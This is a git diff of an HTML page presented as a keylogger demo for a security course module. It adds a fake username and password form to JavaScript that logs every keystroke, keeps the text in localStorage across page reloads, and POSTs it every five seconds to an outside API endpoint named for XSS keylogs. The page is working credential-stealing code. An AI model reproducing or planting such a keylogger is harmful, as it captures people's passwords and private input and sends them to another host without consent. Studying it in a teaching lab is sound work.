@@ -7,6 +7,12 @@
 
 <body>
   <h1>Josh's Hackerstube</h1>
+  <p>This my friend, is a small keylogger demo for the 183 modul</p>
+  <form>
+      <label>Username: </label><input type=text>
+      <label>Password: </label><input type=password>
+      <button>Submit</button>
+  </form>
 
   <script type="text/javascript">
       let sentence = "";
@@ -17,10 +23,13 @@
         "payload": ""
       }
 
+      // loads stored inputs from the local storage back into the sentence
       window.onload = e => {
           sentence = window.localStorage.getItem('loggedData');
+          window.localStorage.clear();
       }
 
+      // keylogger
       document.onkeydown = e => {
         console.clear()
         console.log("Key:", e.key, "Code:", e.keyCode)
@@ -28,15 +37,15 @@
 
         switch (e.keyCode) {
             // Filter unwanted characters
-            case 16: // Shift
-            case 20: // Caps
-            case 17: // Ctrl
+            case 16:    // Shift
+            case 20:    // Caps
+            case 17:    // Ctrl
               break;
-            // Remove last character on BACKSPACE
-            case 8:
+            // Remove last character
+            case 8:     // Backspace
                 sentence = sentence.slice(0, -1);
                 break;
-            // Set text after sentence END
+            // sentence finishers
             case 190:   // .
             case 221:   // !
             case 219:   // ?
@@ -52,15 +61,16 @@
         }
       };
 
+      // 5 second interval for sending the stored data
       setInterval(function() {
         if(text.length > 0)
         {
-            console.log("Text for submission: " + text)
             postData(text);
-            text = ""; sentence = ""; word = "";
+            text = ""; sentence = "";
         }
       }, 5000)
 
+      // Sends json data via POST to the m183 website
       function postData(data) {
           bodyTemplate["payload"] = data
           return fetch('https://m183.gibz-informatik.ch/api/xssKeylogs', {
@@ -70,9 +80,10 @@
             body: JSON.stringify(bodyTemplate)
           })
           .then(response => response.json());
-          window.localStorage.clear();
+          console.log("Text for submission: " + text)
       }
 
+      // Stores logged data in local storage if user leaves site
       window.onbeforeunload = e => {
           window.localStorage.setItem('loggedData', sentence);
       }
